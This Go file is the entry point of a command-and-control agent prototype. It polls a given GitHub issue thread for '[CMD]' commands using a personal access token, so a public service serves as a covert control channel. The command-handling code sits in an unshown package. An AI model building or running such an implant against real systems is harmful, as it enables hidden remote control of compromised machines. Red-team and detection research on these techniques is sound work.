package main

import (
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/kkirabo/c2prototype/agent"
)

// repo is the GitHub repo the agent will poll.
// Format: "owner/repo" — must match where the server creates issues.
const repo = "kkirabo/newest"

func usage() {
	fmt.Println("Usage:")
	fmt.Println("  c2agent <issue-number>    Poll the given issue thread for [CMD] commands")
	fmt.Println("")
	fmt.Println("Environment:")
	fmt.Println("  GITHUB_TOKEN    GitHub personal access token with issues read/write")
	os.Exit(1)
}

func main() {
	args := os.Args[1:]
	if len(args) < 1 {
		usage()
	}

	issueNumber, err := strconv.Atoi(args[0])
	if err != nil || issueNumber <= 0 {
		log.Fatalf("[!] Invalid issue number %q — must be a positive integer", args[0])
	}

	a := agent.New(repo, issueNumber)
	if err := a.Run(); err != nil {
		log.Fatalf("[!] Agent stopped: %s", err)
	}
}
